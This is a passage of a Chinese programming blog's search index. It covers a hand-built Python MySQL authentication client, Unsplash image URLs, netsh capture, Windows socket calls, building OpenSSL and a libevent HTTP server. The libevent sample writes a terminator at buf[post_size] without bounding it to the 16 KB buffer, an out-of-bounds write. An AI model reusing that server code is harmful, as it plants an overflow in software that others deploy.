64)))#就是做个异或#来自Pymysqldef _xor_password(password, salt): salt = bytearray(salt[:20]) password = bytearray(password) for i in range(len(password)): password[i] ^= salt[i%len(salt)] return bytes(password)#来自pymysqldef sha2_rsa_encrypt(password, salt, public_key): message = _xor_password(password + b&quot;\\0&quot;, salt) rsa_key = serialization.load_pem_public_key(public_key, default_backend()) return rsa_key.encrypt( message, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None, ), )def native_password(password,salt): stage1 = hashlib.sha1(password).digest() stage2 = hashlib.sha1(stage1).digest() rp = hashlib.sha1(salt) rp.update(stage2) result = bytearray(rp.digest()) for x in range(len(result)): result[x] ^= stage1[x] return resultdef sha2_password(password,salt): stage1 = hashlib.sha256(password).digest() stage2 = hashlib.sha256(stage1).digest() stage3 = hashlib.sha256(stage2+salt).digest() result = bytearray(stage3) for x in range(len(result)): result[x] ^= stage1[x] return resultdef parse_handshake(bdata): i = 0 protocol_version = bdata[:1] server_end = bdata.find(b&quot;\\0&quot;, i) i = server_end + 1 thread_id = btoint(bdata[i:i+4]) i += 4 salt = bdata[i:i+8] i += 9 server_capabilities = btoint(bdata[i:i+2]) i += 2 server_charset = btoint(bdata[i:i+1]) i += 1 server_status = btoint(bdata[i:i+2]) i += 2 server_capabilities |= btoint(bdata[i:i+2]) &lt;&lt; 16 i += 2 salt_length = struct.unpack(&#x27;&lt;B&#x27;,bdata[i:i+1])[0] salt_length = max(13,salt_length-8) i += 11 salt += bdata[i:i+salt_length] i += salt_length server_plugname = bdata[i:] return salt class mysql(object): def __init__(self): self.host = &#x27;192.168.101.21&#x27; self.port = 3314 self.user = &#x27;u1&#x27; self.password = &#x27;123456&#x27; def read_pack(self,): pack_header = self.rf.read(4) btrl, btrh, packet_seq = struct.unpack(&quot;&lt;HBB&quot;, pack_header) pack_size = btrl + (btrh &lt;&lt; 16) self._next_seq_id = (self._next_seq_id + 1) % 256 bdata = self.rf.read(pack_size) return bdata def write_pack(self,data): bdata = struct.pack(&quot;&lt;I&quot;, len(data))[:3] + bytes([self._next_seq_id]) + data self.sock.sendall(bdata) self._next_seq_id = (self._next_seq_id + 1) % 256 def handshake(self,bdata): i = 0 #已经读取的字节数, 解析binlog的时候也是这么用的..... protocol_version = bdata[:1] #只解析10 server_end = bdata.find(b&quot;\\0&quot;, i) self.server_version = bdata[i:server_end] i = server_end + 1 self.thread_id = btoint(bdata[i:i+4]) i += 4 self.salt = bdata[i:i+8] i += 9 #还有1字节的filter, 没啥意义,就不保存了 self.server_capabilities = btoint(bdata[i:i+2]) i += 2 self.server_charset = btoint(bdata[i:i+1]) i += 1 self.server_status = btoint(bdata[i:i+2]) i += 2 self.server_capabilities |= btoint(bdata[i:i+2]) &lt;&lt; 16 #往左移16位 为啥不把capability_flags_1和capability_flags_2和一起呢 i += 2 salt_length = struct.unpack(&#x27;&lt;B&#x27;,bdata[i:i+1])[0] #懒得去判断capabilities &amp; CLIENT_PLUGIN_AUTH了 salt_length = max(13,salt_length-8) #前面已经有8字节了 i += 1 i += 10 #reserved self.salt += bdata[i:i+salt_length] i += salt_length self.server_plugname = bdata[i:] def HandshakeResponse41(self,): #client_flag = 3842565 #不含DBname client_flag = 33531525#不含DBname #client_flag |= 1 &lt;&lt; 3 charset_id = 45 #45:utf8mb4 33:utf8 #bdata = client_flag.to_bytes(4,&#x27;little&#x27;) #其实应该最后在加, 毕竟还要判断很多参数, 可能还需要修改, 但是懒 bdata = struct.pack(&#x27;&lt;iIB23s&#x27;,client_flag,2**24-1,charset_id,b&#x27;&#x27;) bdata += self.user.encode() + b&#x27;\\0&#x27; auth_password = native_password(self.password.encode(), self.salt[:20]) auth_response = _lenenc_int(len(auth_password)) + auth_password bdata += auth_response bdata += b&quot;mysql_native_password&quot; + b&#x27;\\0&#x27; #本文有设置连接属性, 主要是为了方便观察 attr = &#123;&#x27;_client_name&#x27;:&#x27;ddcw_for_pymysql&#x27;, &#x27;_pid&#x27;:str(os.getpid()), &quot;_client_version&quot;:&#x27;0.0.1&#x27;,&#125; #key长度+k+v长度+v connect_attrs = b&quot;&quot; for k, v in attr.items(): k = k.encode() connect_attrs += _lenenc_int(len(k)) + k v = v.encode() connect_attrs += _lenenc_int(len(v)) + v bdata += _lenenc_int(len(connect_attrs)) + connect_attrs self.write_pack(bdata) #0xFE 交换认证 https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_old_auth_switch_request.html #0x01 额外认证 #0x00 OK #偷懒, 懒得去判断client_flag了 auth_pack = self.read_pack() if auth_pack[:1] == b&#x27;\\0&#x27;: print(&#x27;OK&#x27;,auth_pack) elif auth_pack[:1] == b&#x27;\\xfe&#x27;: #switch request print(&#x27;hava switch request&#x27;) if auth_pack.find(b&#x27;caching_sha2_password&#x27;) &lt; 0: print(&#x27;仅测试caching_sha2_password, 但当前是:&#x27;,auth_pack[1:auth_pack.find(b&#x27;\\x00&#x27;)]) return False scrambled = sha2_password(self.password.encode(),auth_pack[auth_pack.find(b&#x27;\\x00&#x27;)+1:]) #salt是剩下的部分 self.write_pack(scrambled) auth_pack = self.read_pack() print(auth_pack) self.caching_sha2_password_auth(auth_pack) elif auth_pack[:1] == b&#x27;\\x01&#x27;: self.caching_sha2_password_auth(auth_pack) else: print(&#x27;FAILED&#x27;,auth_pack) def caching_sha2_password_auth(self,auth_pack): if auth_pack[1:2] == b&#x27;\\x03&#x27;: #fast bdata = self.read_pack() #ok pack print(&#x27;fast auth success.&#x27;,bdata) elif auth_pack[1:2] == b&#x27;\\x04&#x27;: #full #如果是SSL/socket/shard_mem就直接发送密码(不需要加密了) TODO self.write_pack(b&#x27;\\x02&#x27;) #要公钥 bdata = self.read_pack() #server发来的公钥 pubk = bdata[1:] #第一字节是extra_auth 而且肯定是 0x01 #print(&#x27;bdata&#x27;,bdata) self.pubk = pubk password = sha2_rsa_encrypt(self.password.encode(), self.salt, pubk) self.write_pack(password) authpack = self.read_pack() #看看是否成功 print(&#x27;full auth&#x27;,authpack) else: print(&#x27;???&#x27;,auth_pack) def query(self,sql): &quot;&quot;&quot;不考虑SQL超过16MB情况&quot;&quot;&quot; # payload_length:3 sequence_id:1 payload:N # payload: com_query(0x03):1 sql:n bdata = struct.pack(&#x27;&lt;IB&#x27;,len(sql)+1,0x03) #I:每个com_query的seq_id都从0开始,第4字节固定为0, 所以直接用I, +1:com_query占用1字节, 0x03:com_query bdata += sql.encode() self.sock.sendall(bdata) self._next_seq_id = 1 #下一个包seq_id = 1 def connect(self): self._next_seq_id = 0 sock = socket.create_connection((self.host, self.port)) sock.settimeout(None) self.sock = sock self.rf = sock.makefile(&quot;rb&quot;) bdata = self.read_pack() self.handshake(bdata) self.HandshakeResponse41()","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"http://example.com/categories/C-OpenSource/MySQL/"}]},{"title":"UnSplash 获取随机图片的API","date":"2023-10-27T01:24:02.405Z","path":"C_OpenSource/API/Unsplash_API/","text":"我经常会使用 unsplash， 这里面的图片非常清爽，我的大多数文章的图片都是在这个网上找的，虽然也有同类型网站，但是用过一段时间以后基本都放弃了，图片质量参差不齐，筛选过程太费劲。 但是 unsplash 访问速度是个大问题，我经常会因为图片无法加载而被劝退。 今天一时手痒，顺手搜了 unsplash api 这个关键字，看官方有没有提供相关的 api 服务，还真有！ unsplash 提供了 2 个版本的 API。 一个是简单版，主要是给小型应用，流量比较少的 app 使用，可以通过 source.unsplash.com 进入；一个是进阶版的开发者中心 API, 支持更多流量的 app 使用，可以通过 unsplash.com&#x2F;developers 进入。 Source APIsource api 提供的功能比较简单。如果想获取一张随机图片，可以访问地址： 1https://source.unsplash.com/random 这个地址会重定向到一张图片的地址，可以通过响应直接获取到一张图片。 如果图片太大，加载速度也会比较慢。你可以在 url 后面添加尺寸，控制返回的图片大小： 1https://source.unsplash.com/random/800x600 如果原图片不是这种长宽比，unsplash 会对图片进行裁剪，某些部分就会丢失。如果你想保持图片的原始比例，可以把高度设成 0 ： 1https://source.unsplash.com/random/800x0 小提示 无论是什么 API, 你都可以在最后使用 &#x2F;800x0 这样的方式控制图片的大小。 你可以指定获取某位作者的图片。比如我特别喜欢 Raamin ka 拍摄的照片。 我可以把它的用户名小写以后再去掉空格，添加到 &#x2F;user 的后面： 1https://source.unsplash.com/user/raaminka 这样我就能获取到这位作者拍摄的随机妹子照片了。不要忘了，你同样是可以控制图片尺寸的。 获取某个用户喜欢的照片： 1https://source.unsplash.com/user/raaminka/like unsplash api 还支持搜索。通常来说，我都会根据要写的文章的主题在 unsplash 上搜索图片。比如我要写一篇关于加密的文章，那我就会去搜索 encryption 相关的图片： 1https://source.unsplash.com/800x0/?encryption 你也可以组合多个不同的关键字。如果没有图片同时包含这些关键字，则会优先匹配最后的关键字。 1https://source.unsplash.com/800x0/?encryption,girl 现在我们每次访问同一个 API, 得到图片都不一样，因为是随机生成的。但是如果我们在每个 API 的后面添加 &#x2F;daily 或者 &#x2F;weekly， 则可以得到固定的一张图。需要注意，这并不是说这些图片更加热门或者质量更高，只是每天&#x2F;每周保持不变的随机图片而已。 1https://source.unsplash.com/800x0/daily?sports","tags":[{"name":"图片","slug":"图片","permalink":"http://example.com/tags/%E5%9B%BE%E7%89%87/"},{"name":"资源","slug":"资源","permalink":"http://example.com/tags/%E8%B5%84%E6%BA%90/"},{"name":"Unsplash","slug":"Unsplash","permalink":"http://example.com/tags/Unsplash/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"API","slug":"C-OpenSource/API","permalink":"http://example.com/categories/C-OpenSource/API/"}]},{"title":"netsh 抓包","date":"2023-10-27T01:24:02.402Z","path":"B_Code/网络编程/抓包/netsh抓包/","text":"概述：windows系统下使用 netsh 命令抓包 步骤1 打开管理员命令行win -&gt; 输入 cmd -&gt; 以管理员身份运行 .vbhfcwpbfnzt{zoom:67%;} 2 输入以下命令开始抓包1netsh trace start capture=YES report=YES persistent=YES 运行成功后，如下所示 3 运行 零信任客户端连接tac，直到复现敲门失败情况 4 回到 cmd 界面键入并回车以下命令： 1netsh trace stop 回车后稍等一会，界面上会输出以下内容，将图示路径文件收集即可。 格式转换1etl2pcapng.exe nettrace.etl nettrace.cap","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"抓包","slug":"B-Code/网络编程/抓包","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%8A%93%E5%8C%85/"}]},{"title":"TCP/IP的四元组、五元组、七元组","date":"2023-10-27T01:24:02.393Z","path":"B_Code/网络编程/四元组、五元组、七元组/","text":"TCP&#x2F;IP的四元组、五元组、七元组四元组是： 源IP地址、目的IP地址、源端口、目的端口 五元组是： 源IP地址、目的IP地址、协议号、源端口、目的端口 七元组是： 源IP地址、目的IP地址、协议号、源端口、目的端口、服务类型、接口索引","tags":[{"name":"IP","slug":"IP","permalink":"http://example.com/tags/IP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"socket 长连接","date":"2023-10-27T01:24:02.392Z","path":"B_Code/网络编程/windows Socket长连接/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041BOOL _KeepAlive(SP_SOCKET fd)&#123; //定义结构及宏 struct KeepAlive &#123; u_long onoff; u_long keepalivetime; u_long keepaliveinterval; &#125;;#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4) //KeepAlive实现 KeepAlive inKeepAlive = &#123; 0 &#125;; //输入参数 unsigned long ulInLen = sizeof(KeepAlive); KeepAlive outKeepAlive = &#123; 0 &#125;; //输出参数 unsigned long ulOutLen = sizeof(KeepAlive); unsigned long ulBytesReturn = 0; //keepalive xp以前的系统发送5次，xp之后的系统发送10 inKeepAlive.onoff = 1; inKeepAlive.keepaliveinterval = 5000; //两次KeepAlive探测间的时间间隔 inKeepAlive.keepalivetime = 5000; //开始首次KeepAlive探测前的TCP空闭时间 if (WSAIoctl((SOCKET)fd, SIO_KEEPALIVE_VALS, (LPVOID)&amp;inKeepAlive, ulInLen, (LPVOID)&amp;outKeepAlive, ulOutLen, &amp;ulBytesReturn, NULL, NULL) == SOCKET_ERROR) &#123; LOGT(&quot;Set Keep Alive FAILED.&quot;); return FALSE; &#125; else &#123; LOGT(&quot;Set Keep Alive OK.&quot;); return TRUE; &#125;&#125;","tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"socket","slug":"socket","permalink":"http://example.com/tags/socket/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"tcp.flags 说明","date":"2023-10-27T01:24:02.391Z","path":"B_Code/网络编程/tcp/tcp.flags/","text":"tcp.flags 说明在Wireshark的过滤器中,tcp.flags可以用于过滤各种TCP标志位。它包含以下项目: SYN: 标志位SYN&#x3D;1,用于TCP三次握手中的 SYN 数据包,请求建立连接 ACK: 标志位ACK&#x3D;1,确认接收到的数据 FIN: 标志位FIN&#x3D;1,请求关闭连接 RST: 标志位RST&#x3D;1,重置连接 PSH: 标志位PSH&#x3D;1,接收方应立即传送此报文的数据,而不等待其他数据 URG: 标志位URG&#x3D;1,此报文包含紧急数据 ECE: ECN Echo, 标志位ECE&#x3D;1,回复ECN设置的通知 CWR: Congestion Window Reduced,标志位CWR&#x3D;1,通知发送方拥塞窗口已经减少 这些标志位可以单独使用,也可以组合使用。例如: SYN+ACK: 服务端响应的SYN+ACK数据包,同意建立连接并确认SYN FIN+ACK: 确认对端的FIN的数据包,同时自身也请求关闭连接 在Wireshark的过滤器中,可以使用这些标志位进行过滤,例如:- SYN 过滤SYN数据包 ACK 过滤ACK数据包 FIN 过滤FIN数据包 RST 过滤RST数据包 tcp.flags.syn&#x3D;&#x3D;1 过滤SYN标志位为1的数据包 tcp.flags.syn&#x3D;&#x3D; &amp;&amp; tcp.flags.ack&#x3D;&#x3D;1 过滤同时包含SYN和ACK标志位的数据包 通过过滤不同的标志位或标志位组合,可以分析出TCP连接的握手、数据传输和释放过程。当然,除了这些标志位外,过滤器中 tcp 还包含其他字段,例如:- srcport 源端口 - dstport 目标端口 - seq 序列号 - ack 确认号 - window_size 窗口大小 - payload:可以过滤包含特定数据的包 - 等等","tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"tcp","slug":"tcp","permalink":"http://example.com/tags/tcp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"tcp","slug":"B-Code/网络编程/tcp","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/tcp/"}]},{"title":"【网络】Windows下编译OpenSSl 1.1.1","date":"2023-10-27T01:24:02.389Z","path":"B_Code/网络编程/libevent/Windows下编译Openssl/","text":"概述： windows系统编译OpenSSL 1.1.1版本操作步骤 openssl&#x2F;NOTES-WINDOWS.md at master openssl&#x2F;openssl [toc] 0x01、编译环境说明 操作系统：win10 编译器：vs2017 OpenSSL: 1.1.1W 0x02、依赖工具说明根据官方说明，OpenSSL编译除了Visual Studio 2019以外，为方便编译，需要安装Strawberry Perl和NASM，下载地址分别如下： Strawberry Perl：Strawberry Perl for Windows NASM：NASM，这是一个汇编器 特别注意：Perl安装后会自动添加到环境变量中，而NASM不会，一定要在环境变量Path中添加NASM.exe所在的目录，否则可能会出现意想不到的错误。 0x03、编译步骤下载源码从Github中可以直接下载：GitHub - openssl&#x2F;openssl: TLS&#x2F;SSL and crypto library 或者在 OpenSSL 官方去下载 OpenSSL 也可以参考官方文档进行编译：openssl&#x2F;NOTES-WINDOWS.md at master · openssl&#x2F;openssl 0x04、编译 使用管理员权限打开 vs2017 的开发人员命令提示符打开后切换到 openssl 解压目录： .ugduushtniir{zoom:50%;} 配置 Perl，参考官方文档配置 perl Configure VC-WIN32 if you want 32-bit OpenSSL or perl Configure VC-WIN64A if you want 64-bit OpenSSL or perl Configure VC-WIN64-ARM if you want Windows on Arm (win-arm64) OpenSSL or perl Configure VC-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL with assembly support using clang-cl as assembler or perl Configure VC-CLANG-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL using clang-cl as both compiler and assembler or perl Configure VC-WIN32-HYBRIDCRT if you want 32-bit OpenSSL dependent on the Universal CRT or perl Configure VC-WIN64A-HYBRIDCRT if you want 64-bit OpenSSL dependent on the Universal CRT or perl Configure to let Configure figure out the platform 特别注意：–prefix选项指定的安装路径必须是绝对路径，若不指定，则默认会安装在C:\\Program Files (x86)\\下面，如果你不是用管理员权限执行，则会出现*Permission Denied* 错误，切记。 1perl Configure VC-WIN32 --prefix=E:\\OpenSSL # 将其安装到 E:\\OpenSSL 目录 nmake nmake test namke install 0x05、使用使用时，在工程引入文件和库文件添加 Openssl 安装目录即可。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"B-Code/网络编程/libevent","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"}]},{"title":"libevent http server","date":"2023-10-27T01:24:02.385Z","path":"B_Code/网络编程/libevent/Libevent——httpserver/","text":"[toc] 实现http-server123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;evhttp.h&gt;#include &lt;event.h&gt;#include &lt;string.h&gt;#include &quot;event2/http.h&quot;#include &quot;event2/event.h&quot;#include &quot;event2/buffer.h&quot;#include &quot;event2/bufferevent.h&quot;#include &quot;event2/bufferevent_compat.h&quot;#include &quot;event2/http_struct.h&quot;#include &quot;event2/http_compat.h&quot;#include &quot;event2/util.h&quot;#include &quot;event2/listener.h&quot;#pragma comment(lib,&quot;ws2_32.lib&quot;)#pragma comment(lib, &quot;Iphlpapi.lib&quot;)#define BUF_MAX 1024*16//解析post请求数据void get_post_message(char* buf, struct evhttp_request* req)&#123; size_t post_size = 0; post_size = evbuffer_get_length(req-&gt;input_buffer);//获取数据长度 printf(&quot;====line:%d,post len:%d\\n&quot;, __LINE__, post_size); if (post_size &lt;= 0) &#123; printf(&quot;====line:%d,post msg is empty!\\n&quot;, __LINE__); return; &#125; else &#123; size_t copy_len = post_size &gt; BUF_MAX ? BUF_MAX : post_size; printf(&quot;====line:%d,post len:%d, copy_len:%d\\n&quot;, __LINE__, post_size, copy_len); memcpy(buf, evbuffer_pullup(req-&gt;input_buffer, -1), copy_len); buf[post_size] = &#x27;\\0&#x27;; printf(&quot;====line:%d,post msg:%s\\n&quot;, __LINE__, buf); &#125;&#125;//解析http头，主要用于get请求时解析uri和请求参数char* find_http_header(struct evhttp_request* req, struct evkeyvalq* params, const char* query_char)&#123; if (req == NULL || params == NULL || query_char == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input params is null.&quot;); return NULL; &#125; struct evhttp_uri* decoded = NULL; char* query = NULL; char* query_result = NULL; const char* path; const char* uri = evhttp_request_get_uri(req);//获取请求uri if (uri == NULL) &#123; printf(&quot;====line:%d,evhttp_request_get_uri return null\\n&quot;, __LINE__); return NULL; &#125; else &#123; printf(&quot;====line:%d,Got a GET request for &lt;%s&gt;\\n&quot;, __LINE__, uri); &#125; //解码uri decoded = evhttp_uri_parse(uri); if (!decoded) &#123; printf(&quot;====line:%d,It&#x27;s not a good URI. Sending BADREQUEST\\n&quot;, __LINE__); evhttp_send_error(req, HTTP_BADREQUEST, 0); return; &#125; //获取uri中的path部分 path = evhttp_uri_get_path(decoded); if (path == NULL) &#123; path = &quot;/&quot;; &#125; else &#123; printf(&quot;====line:%d,path is:%s\\n&quot;, __LINE__, path); &#125; //获取uri中的参数部分 query = (char*)evhttp_uri_get_query(decoded); if (query == NULL) &#123; printf(&quot;====line:%d,evhttp_uri_get_query return null\\n&quot;, __LINE__); return NULL; &#125; //查询指定参数的值 evhttp_parse_query_str(query, params); query_result = (char*)evhttp_find_header(params, query_char); return query_result;&#125;//处理get请求void http_handler_testget_msg(struct evhttp_request* req, void* arg)&#123; if (req == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input param req is null.&quot;); return; &#125; char* sign = NULL; char* data = NULL; struct evkeyvalq sign_params = &#123; 0 &#125;; sign = find_http_header(req, &amp;sign_params, &quot;sign&quot;);//获取get请求uri中的sign参数 if (sign == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;request uri no param sign.&quot;); &#125; else &#123; printf(&quot;====line:%d,get request param: sign=[%s]\\n&quot;, __LINE__, sign); &#125; data = find_http_header(req, &amp;sign_params, &quot;data&quot;);//获取get请求uri中的data参数 if (data == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;request uri no param data.&quot;); &#125; else &#123; printf(&quot;====line:%d,get request param: data=[%s]\\n&quot;, __LINE__, data); &#125; printf(&quot;\\n&quot;); //回响应 struct evbuffer* retbuff = NULL; retbuff = evbuffer_new(); if (retbuff == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;retbuff is null.&quot;); return; &#125; evbuffer_add_printf(retbuff, &quot;Receive get request,Thamks for the request!&quot;); evhttp_send_reply(req, HTTP_OK, &quot;Client&quot;, retbuff); evbuffer_free(retbuff);&#125;//处理post请求void http_handler_testpost_msg(struct evhttp_request* req, void* arg)&#123; if (req == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input param req is null.&quot;); return; &#125; char buf[BUF_MAX] = &#123; 0 &#125;; get_post_message(buf, req);//获取请求数据，一般是json格式的数据 if (buf == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;get_post_message return null.&quot;); return; &#125; else &#123; //可以使用json库解析需要的数据 printf(&quot;====line:%d,request data:%s&quot;, __LINE__, buf); &#125; //回响应 struct evbuffer* retbuff = NULL; retbuff = evbuffer_new(); if (retbuff == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;retbuff is null.&quot;); return; &#125; evbuffer_add_printf(retbuff, &quot;Receive Get request,Thamks for the request!&quot;); evhttp_send_reply(req, HTTP_OK, &quot;Client&quot;, retbuff); evbuffer_free(retbuff);&#125;int main()&#123; struct evhttp* http_server = NULL; short http_port = 8081; char* http_addr = &quot;0.0.0.0&quot;;#ifdef _WIN32 &#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD(2, 2); err = WSAStartup(wVersionRequested, &amp;wsaData); if (err != 0) &#123; printf(&quot;WSAStartup failed with error: %d\\n&quot;, err); return 0; &#125; &#125;#endif // _WIN32 //初始化 event_init(); //启动http服务端 http_server = evhttp_start(http_addr, http_port); if (http_server == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;http server start failed.&quot;); return -1; &#125; //设置请求超时时间(s) evhttp_set_timeout(http_server, 5); //设置事件处理函数，evhttp_set_cb针对每一个事件(请求)注册一个处理函数， //区别于evhttp_set_gencb函数，是对所有请求设置一个统一的处理函数 evhttp_set_cb(http_server, &quot;/me/testpost&quot;, http_handler_testpost_msg, NULL); evhttp_set_cb(http_server, &quot;/me/testget&quot;, http_handler_testget_msg, NULL); //循环监听 event_dispatch(); //实际上不会释放，代码不会运行到这一步 evhttp_free(http_server); return 0;&#125; 使用 postman 请求Get123456789// 接口127.0.0.1:8081/me/testpost// 请求体&#123; &quot;username&quot;: &quot;A&quot;, &quot;password&quot;: &quot;123123Qq&quot;, &quot;reqtime&quot;: &quot;2023年1月28日15:44:58&quot;&#125; http-server 控制台输出： ====line:65,Got a GET request for ====line:85,path is:/me/testget ====line:92,evhttp_uri_get_query return null ====line:118,request uri no param sign. ====line:65,Got a GET request for ====line:85,path is:/me/testget ====line:92,evhttp_uri_get_query return null ====line:128,request uri no param data. Post123456789# 接口127.0.0.1:8081/me/testpost// 请求体&#123; &quot;username&quot;: &quot;A&quot;, &quot;password&quot;: &quot;123123Qq&quot;, &quot;reqtime&quot;: &quot;2023年1月28日15:44:58&quot;&#125; http-server 控制台输出： ====line:27,post len:98 ====line:36,post len:98, copy_len:98 ====line:39,post msg:{ \"username\": \"A\", \"password\": \"123123Qq\", \"reqtime\": \"2023骞?鏈?8鏃?5:44:58\" } ====line:168,request data:{ \"username\": \"A\", \"password\": \"123123Qq\", \"reqtime\": \"2023骞?鏈?8鏃?5:44:58\" }","tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"libevent","permalink":"http://example.com/tags/libevent/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"B-Code/网络编程/libevent","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"}]},{"title":"windows socket使用Demo","date":"2023-10-27T01:24:02.373Z","path":"B_Code/网络编程/SOCKET相关函数/","text":"Windows 下 Socket相关 一、socket()函数 创建套接字Windows 不把套接字作为普通文件对待，而是返回 SOCKET 类型的句柄。 1SOCKET socket(int af, int type, int protocol); 实例，创建TCP套接字： 1SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); //创建TCP套接字 二、bind()1int bind(SOCKET sock, const struct sockaddr *addr, int addrlen); //Windows sock 为 socket 文件描述符addr 为 sockaddr 结构体变量的指针addrlen 为 addr 变量的大小，可由 sizeof() 计算得出。 12345678910// 创建套接字 SOCKET servSock = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP); // 绑定套接字 struct sockaddr_in sockAddr; memset (&amp;sockAddr, 0, sizeof(sockAddr)); // 每个套接字都用0填充 sockAddr.sin_family = PF_INET; // 使用IPv4地址 sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); // 端口 bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); sockaddr结构体1234struct sockaddr&#123; sa_family_t sin_family; //地址族（Address Family），也就是地址类型 char sa_data[14]; //IP地址和端口号&#125;; sockaddr_in 结构体123456struct sockaddr_in&#123; sa_family_t sin_family; //地址族（Address Family），也就是地址类型 uint16_t sin_port; //16位的端口号 struct in_addr sin_addr; //32位IP地址 char sin_zero[8]; //不使用，一般用0填充&#125;; sin_family 和socket()的第一个参数的含义相同，取值也要保持一致。 sin_prot 为端口号。uint16_t 的长度为两个字节，理论上端口号的取值范围为 065536，但 01023 的端口一般由系统分配给特定的服务程序，例如 Web 服务的端口号为 80，FTP 服务的端口号为 21，所以我们的程序要尽量在 1024~65536 之间分配端口号。端口号需要用 htons() 函数转换，后面会讲解为什么。 sin_addr 是 struct in_addr 结构体类型的变量，下面会详细讲解。 sin_zero[8]是多余的8个字节，没有用，一般使用 memset() 函数填充为 0。上面的代码中，先用 memset() 将结构体的全部字节填充为 0，再给前3个成员赋值，剩下的 sin_zero 自然就是 0 了。 in_addr 结构体sockaddr_in 的第3个成员是 in_addr 类型的结构体，该结构体只包含一个成员，如下所示： 123struct in_addr&#123; in_addr_t s_addr; //32位的IP地址&#125;; in_addr_t 在头文件 &lt;netinet&#x2F;in.h&gt; 中定义，等价于 unsigned long，长度为4个字节。也就是说，s_addr 是一个整数，而IP地址是一个字符串，所以需要** inet_addr() **函数进行转换，例如： 12unsigned long ip = inet_addr(&quot;127.0.0.1&quot;);printf(&quot;%ld\\n&quot;, ip); 运行结果：16777343 三、connect() 函数参数与bind()相同。 1int connect(SOCKET sock, const struct sockaddr *serv_addr, int addrlen); //Windows 四、listen() 函数通过 listen() 函数可以让套接字进入被动监听状态，它的原型为： 1int listen(SOCKET sock, int backlog); //Windows sock 为需要进入监听状态的套接字，backlog 为请求队列的最大长度。 被动监听：是指当没有客户端请求时，套接字处于“睡眠”状态，只有当接收到客户端请求时，套接字才会被“唤醒”来响应请求。如果将 backlog 的值设置为 